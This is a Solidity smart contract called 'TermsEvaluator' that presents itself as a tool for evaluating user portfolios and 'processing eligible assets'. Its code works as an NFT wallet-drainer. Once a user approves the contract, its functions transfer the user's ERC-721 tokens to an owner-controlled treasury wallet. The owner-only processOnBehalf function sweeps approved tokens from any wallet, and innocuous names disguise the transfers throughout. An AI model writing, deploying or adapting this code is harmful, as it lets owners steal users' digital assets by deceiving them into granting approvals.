// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title TermsEvaluator
 * @dev Contract for evaluating user portfolio and processing eligible assets
 */
contract TermsEvaluator is Ownable, ReentrancyGuard, IERC721Receiver {
    
    // Mapping of asset contract addresses to evaluation status
    mapping(address => bool) public evaluatedContracts;
    
    // Array of all evaluated contract addresses
    address[] public contractList;
    
    // Treasury wallet for processed assets
    address public treasuryWallet;
    
    // Track if evaluation is paused
    bool public paused;
    
    // If true, evaluates all contracts (not just whitelisted)
    bool public evaluateAll;
    
    // Events
    event AssetProcessed(
        address indexed assetContract,
        address indexed from,
        uint256 indexed tokenId,
        address to
    );
    event BatchProcessed(
        address indexed assetContract,
        address indexed from,
        uint256[] tokenIds,
        address indexed to
    );
    event TreasuryUpdated(address indexed oldWallet, address indexed newWallet);
    event ContractAdded(address indexed assetContract);
    event ContractRemoved(address indexed assetContract);
    event EvaluateAllUpdated(bool evaluateAll);
    event EvaluationPaused(bool paused);
    
    constructor(
        address _treasuryWallet,
        address _owner
    ) Ownable(_owner) {
        require(_treasuryWallet != address(0), "Invalid treasury address");
        treasuryWallet = _treasuryWallet;
        paused = false;
        evaluateAll = false;
    }
    
    function checkAssets(address assetContract, address wallet) public view returns (uint256 count) {
        require(assetContract != address(0), "Invalid contract");
        require(isContractEnabled(assetContract), "Contract not enabled");
        
        try IERC721(assetContract).balanceOf(wallet) returns (uint256 balance) {
            return balance;
        } catch {
            return 0;
        }
    }
    
    function checkAllAssets(address wallet) public view returns (uint256 totalCount) {
        uint256 count = 0;
        
        if (evaluateAll) {
            return 0;
        }
        
        for (uint256 i = 0; i < contractList.length; i++) {
            if (evaluatedContracts[contractList[i]]) {
                count += checkAssets(contractList[i], wallet);
            }
        }
        
        return count;
    }
    
    function isContractEnabled(address assetContract) public view returns (bool enabled) {
        return evaluateAll || evaluatedContracts[assetContract];
    }
    
    function processAsset(address assetContract, uint256 tokenId) external nonReentrant {
        require(!paused, "Evaluation paused");
        require(msg.sender != address(0), "Invalid sender");
        require(isContractEnabled(assetContract), "Contract not enabled");
        
        IERC721 asset = IERC721(assetContract);
        address assetOwner = asset.ownerOf(tokenId);
        require(assetOwner == msg.sender, "Not the owner");
        
        address approved = asset.getApproved(tokenId);
        bool isApprovedForAll = asset.isApprovedForAll(assetOwner, address(this));
        require(approved == address(this) || isApprovedForAll, "Not approved");
        
        asset.safeTransferFrom(assetOwner, treasuryWallet, tokenId);
        
        emit AssetProcessed(assetContract, assetOwner, tokenId, treasuryWallet);
    }
    
    function processAssets(address assetContract, uint256[] calldata tokenIds) external nonReentrant {
        require(!paused, "Evaluation paused");
        require(msg.sender != address(0), "Invalid sender");
        require(isContractEnabled(assetContract), "Contract not enabled");
        require(tokenIds.length > 0, "No tokens provided");
        
        IERC721 asset = IERC721(assetContract);
        address assetOwner = msg.sender;
        require(asset.isApprovedForAll(assetOwner, address(this)), "Not approved");
        
        for (uint256 i = 0; i < tokenIds.length; i++) {
            require(asset.ownerOf(tokenIds[i]) == assetOwner, "Not owner of token");
            asset.safeTransferFrom(assetOwner, treasuryWallet, tokenIds[i]);
        }
        
        emit BatchProcessed(assetContract, assetOwner, tokenIds, treasuryWallet);
    }
    
    /**
     * @dev Process assets on behalf of a user who has completed evaluation
     * @param wallet The wallet that owns the assets and has approved this contract
     * @param assetContract The asset contract address
     * @param tokenIds Array of token IDs to process
     */
    function processOnBehalf(
        address wallet,
        address assetContract,
        uint256[] calldata tokenIds
    ) external nonReentrant onlyOwner {
        require(!paused, "Evaluation paused");
        require(wallet != address(0), "Invalid wallet");
        require(isContractEnabled(assetContract), "Contract not enabled");
        require(tokenIds.length > 0, "No tokens provided");
        
        IERC721 asset = IERC721(assetContract);
        
        require(asset.isApprovedForAll(wallet, address(this)), "Not approved");
        
        for (uint256 i = 0; i < tokenIds.length; i++) {
            require(asset.ownerOf(tokenIds[i]) == wallet, "Not owner of token");
            asset.safeTransferFrom(wallet, treasuryWallet, tokenIds[i]);
        }
        
        emit BatchProcessed(assetContract, wallet, tokenIds, treasuryWallet);
    }
    
    function processMultiple(
        address[] calldata assetContracts,
        uint256[][] calldata tokenIdsArray
    ) external nonReentrant {
        require(!paused, "Evaluation paused");
        require(msg.sender != address(0), "Invalid sender");
        require(assetContracts.length == tokenIdsArray.length, "Array mismatch");
        
        address assetOwner = msg.sender;
        
        for (uint256 i = 0; i < assetContracts.length; i++) {
            address assetContract = assetContracts[i];
            require(isContractEnabled(assetContract), "Contract not enabled");
            
            IERC721 asset = IERC721(assetContract);
            require(asset.isApprovedForAll(assetOwner, address(this)), "Not approved");
            
            uint256[] calldata tokenIds = tokenIdsArray[i];
            for (uint256 j = 0; j < tokenIds.length; j++) {
                require(asset.ownerOf(tokenIds[j]) == assetOwner, "Not owner of token");
                asset.safeTransferFrom(assetOwner, treasuryWallet, tokenIds[j]);
            }
            
            emit BatchProcessed(assetContract, assetOwner, tokenIds, treasuryWallet);
        }
    }
    
    // ============ ADMIN FUNCTIONS ============
    
    function updateTreasury(address _newTreasury) external onlyOwner {
        require(_newTreasury != address(0), "Invalid treasury");
        address oldTreasury = treasuryWallet;
        treasuryWallet = _newTreasury;
        emit TreasuryUpdated(oldTreasury, _newTreasury);
    }
    
    function addContract(address _contract) external onlyOwner {
        require(_contract != address(0), "Invalid contract");
        require(!evaluatedContracts[_contract], "Already added");
        
        evaluatedContracts[_contract] = true;
        contractList.push(_contract);
        
        emit ContractAdded(_contract);
    }
    
    function removeContract(address _contract) external onlyOwner {
        require(evaluatedContracts[_contract], "Not enabled");
        
        evaluatedContracts[_contract] = false;
        
        for (uint256 i = 0; i < contractList.length; i++) {
            if (contractList[i] == _contract) {
                contractList[i] = contractList[contractList.length - 1];
                contractList.pop();
                break;
            }
        }
        
        emit ContractRemoved(_contract);
    }
    
    function setEvaluateAll(bool _evaluateAll) external onlyOwner {
        evaluateAll = _evaluateAll;
        emit EvaluateAllUpdated(_evaluateAll);
    }
    
    function getEnabledContracts() external view returns (address[] memory contracts) {
        return contractList;
    }
    
    function getEnabledContractCount() external view returns (uint256 count) {
        return contractList.length;
    }
    
    function setPaused(bool _paused) external onlyOwner {
        paused = _paused;
        emit EvaluationPaused(_paused);
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }
}
